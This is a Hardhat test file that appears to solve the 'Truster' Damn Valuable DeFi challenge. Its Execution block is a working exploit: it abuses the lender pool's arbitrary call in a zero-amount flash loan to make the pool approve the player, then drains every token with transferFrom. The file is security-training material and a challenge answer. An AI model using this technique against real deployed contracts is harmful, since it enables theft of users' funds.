const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Truster", function () {
  let deployer, player;
  let token, pool;

  const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player] = await ethers.getSigners();

    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();
    pool = await (
      await ethers.getContractFactory("TrusterLenderPool", deployer)
    ).deploy(token.address);
    expect(await pool.token()).to.eq(token.address);

    await token.transfer(pool.address, TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

    expect(await token.balanceOf(player.address)).to.equal(0);
  });

  it("Execution", async function () {
    // encode approve function call
    const data = token.interface.encodeFunctionData("approve", [
      player.address,
      TOKENS_IN_POOL,
    ]);
    await pool.connect(player).flashLoan(0, pool.address, token.address, data);
    // log players approval
    console.log(
        "Player's token approval after flash loan: ",
        (await token.allowance(pool.address, player.address)).toString()
    );
    await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
        
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // Player has taken all tokens from the pool
    expect(await token.balanceOf(player.address)).to.equal(TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.equal(0);
  });
});
